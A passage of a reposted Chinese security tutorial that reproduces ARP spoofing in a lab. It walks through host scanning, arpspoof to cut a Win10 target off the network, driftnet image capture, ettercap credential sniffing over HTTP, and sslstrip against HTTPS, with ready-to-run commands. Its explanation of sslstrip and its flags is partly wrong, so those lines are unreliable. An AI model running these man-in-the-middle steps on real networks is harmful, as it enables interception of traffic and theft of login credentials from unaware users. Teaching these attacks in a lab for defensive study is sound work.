---
title: [转]《网络安全应急管理与技术实践》网络层-无线ARP欺骗与消息监听重现分析
url: https://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247500771&idx=1&sn=9dcbaf6a5ec05056fe41508aeb6078c4&chksm=cfcf732ef8b8fa3825150961a316806a4884b2783c4595a509fa996c5af3bbdf2ffb9f793826&scene=58&subscene=0#rd
source: 娜璋AI安全之家
date: 2024-09-26
fetch_date: 2025-10-06T18:30:29.809734
---

# [转]《网络安全应急管理与技术实践》网络层-无线ARP欺骗与消息监听重现分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEpafibeVlkzIuGib5uEZoKMDX6ZYAxOFic6VWSe9gloRO2XJTn3Yd5kuZQ/0?wx_fmt=jpeg)

# [转]《网络安全应急管理与技术实践》网络层-无线ARP欺骗与消息监听重现分析

娜璋AI安全之家

编者荐语：

推荐大家关注『愚公搬代码』老师的公众号，非常优秀的创作者。也推荐大家关注作者的『网络攻防和AI安全之家』知识星球。

以下文章来源于愚公搬代码
，作者愚公搬代码

![](http://wx.qlogo.cn/mmhead/4h0Uv4XOMvOepN9r4GBnibdINWHskMZza9Hpjl4TT4qfBBpt41l2Tp0e7WWnxl71GiacWbVlTcZCU/0)

**愚公搬代码**
.

汇集各种IT相关知识传播，包含企业级解决方案，培训知识，互联网项目，AI，小程序，前端，后端，运维，大数据，网络安全等等。

> 作者简介，愚公搬代码
> 🏆《头衔》：华为云特约编辑，华为云云享专家，华为开发者专家，华为产品云测专家，CSDN博客专家，CSDN商业化专家，阿里云专家博主，阿里云签约作者，腾讯云优秀博主，腾讯云内容共创官，掘金优秀博主，51CTO博客专家等。🏆《近期荣誉》：2022年度博客之星TOP2，2023年度博客之星TOP2，2022年华为云十佳博主，2023年华为云十佳博主等。🏆《博客内容》：.NET、Java、Python、Go、Node、前端、IOS、Android、鸿蒙、Linux、物联网、网络安全、大数据、人工智能、U3D游戏、小程序等相关领域知识。🏆🎉欢迎 👍点赞✍评论⭐收藏

# 🚀前言

无线ARP欺骗（Wireless ARP Spoofing）是一种网络攻击方式，它利用ARP（地址解析协议）中的漏洞，欺骗通信双方，使其将通信数据发送给攻击者，从而实现中间人攻击。消息监听（Message Eavesdropping）则是指攻击者截获并监听通信双方之间的通信数据。

以下是无线ARP欺骗与消息监听的重现分析过程：

1. 攻击者在同一局域网中启动无线ARP欺骗工具，如Ettercap、ARPwner等。
2. 攻击者扫描附近的无线网络，获取目标网络的SSID（无线网络名称）和MAC地址。
3. 攻击者伪造一个与目标无线路由器相同的MAC地址，并将其发送给目标设备，欺骗目标设备将通信数据发送给攻击者。
4. 目标设备在发送数据时，会通过ARP请求获取目标设备的MAC地址，攻击者会回复该ARP请求，将自己的MAC地址发送给目标设备。
5. 目标设备将通信数据发送给攻击者，攻击者可以对数据进行监听、篡改或截获等操作。
6. 攻击者可以通过数据包分析工具（如Wireshark）对通信数据进行分析，获取目标设备之间的通信内容。

无线ARP欺骗和消息监听可以用于多种攻击场景，如窃取敏感信息、篡改通信数据、劫持网页等。网络用户应采取一些安全措施以防止此类攻击，如使用加密的无线网络、启用防火墙、定期更新操作系统和应用程序等。网络管理员也应实施网络监控和入侵检测系统，及时发现和应对此类攻击行为。

# 🚀一、无线ARP欺骗与消息监听重现分析

## 🔎1.断网攻击实施步骤

### 🦋1.1 Win10信息查询

在Win10中，在命令提示符中输入命令“ipconfig /all”查看自身的MAC地址和网关IP地址![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEelHA2cuCF6uw9LsI9ryCFTMiaia3YiaoXRdZ02evFXYNCJiaoCEVPyCvJw/640?wx_fmt=png&from=appmsg)

### 🦋1.2 kali信息查询

在kali终端中，输入命令“ifconfig”，查看kali的IP地址与MAC地址，如图所示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEckEcMia83PiaozruM6wfM5KnicJggsDxzB1ic3yURVJ0BN539iaxNYOs0rg/640?wx_fmt=png&from=appmsg)

### 🦋1.3 主机扫描

方法1：执行ping扫描最简单的方法是使用工具fping，fping使用ICMP ECHO一次请求多个主机，对当前局域网还存在那些主机进行快速扫描，以确定要攻击的主机的ip地址。

```
fping -a -g 192.168.182.0/24 > result
```

使用fping工具扫描了192.168.182.0/24网段内的所有主机，并将扫描结果输出到result文件中。其中，-a参数表示只输出活动的主机，-g参数表示扫描整个网段。![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CETVPLhaz8rSem4zJeC7mcJLmFobuCPYk7Zicue0JiatUIpdKV2JFf99dA/640?wx_fmt=png&from=appmsg)方法2：执行`nmap -sP 192.168.182.0/24`，扫描网络中活跃的主机。（推荐使用）![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CELQdibia6MkH8xTv7pdEfqIEzAmfl0ApBtsAbXukH4ib0ogyiaib7c4yQLVw/640?wx_fmt=png&from=appmsg)-sP 选项表示只利用ping扫描进行主机发现，不进行端口扫描

-sS 进行TCP的半开放扫描，如果禁ping的时候可以使用这个参数

注：用nmap进行主机扫描速度快，而且能穿透防火墙，是比较可靠的扫描工具。

### 🦋1.4 arpspoof欺骗

arpspoof是一个在Linux系统中使用的命令行工具，它用于进行ARP欺骗攻击。ARP（Address Resolution Protocol）是一种用于将IP地址映射到MAC地址的协议，而ARP欺骗则是指攻击者伪造ARP响应来欺骗通信双方，从而中断、截获或篡改网络通信。

arpspoof工具可以欺骗目标设备，使其认为攻击者的MAC地址是与目标设备通信的网关的MAC地址，同时欺骗网关，使其认为攻击者的MAC地址是与目标设备通信的MAC地址。这样，攻击者就可以拦截目标设备和网关之间的通信，并截获或篡改数据。

使用arpspoof工具需要在Linux系统中安装dsniff软件包，然后通过以下命令进行ARP欺骗攻击：

```
arpspoof -i <interface> -t <target> <gateway>
```

其中，`<interface>`是网卡接口，如eth0或wlan0；`<target>`是目标设备的IP地址；`<gateway>`是网关的IP地址。

#### ☀️1.4.1 更换更新源为阿里云，原有的更新源加#号注释

使用命令打开对应更新源文件：vim /etc/apt/sources.list

添加下面源地址：

```
#阿里云Kali镜像源

deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib

deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib

#中科大Kali镜像源

deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib

deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib

#清华大学Kali镜像源

deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free

deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free

#kali源

deb http://http.kali.org/kali kali-rolling main contrib non-free

deb-src http://http.kali.org/kali kali-rolling main contrib non-freedeb
```

#### ☀️1.4.2 更新源

```
apt-get update
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEeEuU56l5ua8Nmq2EAxK8T9ucGe8HQAqnkm9GyHCytz3SKicEY733Wcw/640?wx_fmt=png&from=appmsg)

#### ☀️1.4.3 安装dsniff

```
apt-get install dsniff
```

命令格式：arpspoof  -h  #查看arpspoof版本信息

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEQvz35FgUYLO5b7ebASX7XNSGSSuzpdOPdmc0alQuicUXQ4Sz32JbrUQ/640?wx_fmt=png&from=appmsg)

* -i 后面的参数是网卡名称
* -t 后面的参数是目的主机和网关，截获目的主机发往网关的数据包

#### ☀️1.4.4 断网攻击

```
arpspoof -i eth0 -t 192.168.182.137 192.168.182.2
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEpha9x1MpnDfXQQic4M5ZG50108afu8bVFaXkNswzibLga6GvSt5bxP7w/640?wx_fmt=png&from=appmsg)arp  -a   查看靶机网关mac地址的变化![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEnnozlPreVOZtm82yPVUnPSpmTlYfIjbhK85iaRkQyeic2asWtq6fF0Sg/640?wx_fmt=png&from=appmsg)

## 🔎2.内网截获图片

### 🦋2.1 开启IP转发功能

输入如下命令开启本机的IP转发功能

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

使用这种方式进行的赋值只是暂时的，重启过后将无效，如果想让其永久生效需要修改配置文件，输入vim /etc/sysctl.conf，使用vim编辑器打开该文件，找到#net.ipv4.ip\_forward=1这项，去掉“#”号，或者在其下方输入net.ipv4.ip\_forward=1，即就是让net.ipv4.ip\_forward=1生效，保存退出，即能永久生效。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEmgsp6lUaDyAvYgboqhJqbsicicmcZb3CUtOaxNeNM1PUvqCc7QM5RNBQ/640?wx_fmt=png&from=appmsg)

在ARP欺骗前，ping baidu.com -t检查是否能够上网![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEvFEvWOr70bX4gBUVfakfVw50DVzmtwsdjLnuXprPyNkV1vR0Wic1Ylw/640?wx_fmt=png&from=appmsg)目标ip（win10）：192.168.182.137，正常上网![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEa6FqstY24zrRy099tneianDVnSrqHgBUSBIe9dSDBHCjYlFNhm4motA/640?wx_fmt=png&from=appmsg)

### 🦋2.2 driftnet获取图片

Driftnet是一种网络工具，它被设计成可以在网络上捕获和查看图像的通信内容。这个工具通常用于监视和截取其他人的网络流量，特别是用于捕获Web浏览器中浏览的图像。Driftnet可以在类似Wi-Fi网络上使用，可以捕获通过网络传输的图像文件，并将其显示在用户的屏幕上。

```
driftnet -i eth0
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEIuczukUFFE3JUJ987YvKxa0icC5hibicicwemQbVz0MrT3o191bapTA8LA/640?wx_fmt=png&from=appmsg)

## 🔎3.HTTP账户密码获取

```
ettercap -Tq -i eth0
```

* -T 文本模式输出，不使用图形用户界面 -q 静默模式
* -i 指定要监听的网络接

在win10访问登录网址，输入用户名及密码，网址：http://a.aixjt.com/AdminPublic.html![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEzqPEE4RbKqooC1Z3nw83gqETtdyOx6XMeGJcB1eJ3VlkCgqicSqeq6w/640?wx_fmt=png&from=appmsg)返回kali攻击机，查看记录![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CECcpugCw9TD8Y5Dnj0ic8s4MiaicQI7qYkiaAoAD15s7eibrjrlt1ND9iahUQ/640?wx_fmt=png&from=appmsg)

## 🔎4.HTTPS账户密码获取

### 🦋4.1 修改 ettercap 的配置文件

输入命令打开文本，修改 ettercap 的配置文件

```
vim /etc/ettercap/etter.conf
//或
mousepad /etc/ettercap/etter.conf
```

将 ec\_uid 和 ec gid 修改如下配置为 0，代表使用root用户运行

```
[privs]
ec uid = 0
ec_gid = 0
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEEiaIUWejUwpQmZBdo5X8MzxGE65j35jnZibib92CAdAwrd7D9enIaiaQrg/640?wx_fmt=png&from=appmsg)

找到下红框的内容，输入字母i进入编辑模式，把#注释符去掉，按键盘右上角ESC键退出编辑模式，进入命令行模式，同时按住shift键与冒号键：然后输入wq进行保存并退出。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEy5GxpZjeTKq29G3bao3Srq7zYrXAPALibLsyzJ7RH0TJynUIgaWAXlA/640?wx_fmt=png&from=appmsg)保存后退出。

### 🦋4.2  sslstrip

SSLStrip是一个网络攻击工具，旨在绕过安全传输层（SSL，Secure Sockets Layer）保护的网站。它的原理是将HTTPS（安全HTTP）连接转换为普通的HTTP连接，从而使攻击者能够以明文形式查看和捕获用户的敏感信息，如用户名、密码和其他机密数据。

SSLStrip的工作原理如下：

1. 当用户尝试与一个使用HTTPS连接的网站建立通信时，攻击者将HTTP请求重定向到一个使用普通HTTP连接的伪造网站。
2. 攻击者通过在伪造网站上提供伪造的SSL证书，使用户的浏览器认为它正在与目标网站建立安全的HTTPS连接。
3. 用户的浏览器会继续使用HTTP连接与伪造网站进行通信，而不是真正的HTTPS连接。
4. 所有传输的数据都以明文形式在用户和伪造网站之间传输，使攻击者可以获取用户的敏感信息。

SSLStrip仅适用于那些没有全面实施HTTPS的网站。为了保护自己免受这种类型的攻击，用户应使用最新版本的浏览器，并尽量避免使用公共Wi-Fi网络或其他不受信任的网络连接。而对于网站管理员来说，应该确保其网站全面实施了HTTPS，并采取其他安全措施来防止SSLStrip攻击。

命令执行：

```
sslstrip -a -f –k
```

* -a选项表示将所有请求重定向到攻击者控制的设备上
* -f选项表示强制使用HTTP而不是HTTPS
* -k选项表示忽略证书错误。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lg3CU6bnicXstCibAyLTAiajb0JGXJOa8CEnmkpVR3bCIsXZ75K9fViawA7goSxeCQKtBxuibkfUP2ia224oT7iaSgZDg/640?wx_fmt=png&from=appmsg)

### 🦋4.3 ettercap

```
ettercap -Tq -i eth0
```

* -T 文本模式输出，不使用图形用户界面 -q 静默模式
* -i 指定要监听的网络接

在win10访问登录网址，输入用户名及密码，网址：https://order.ems.com.c...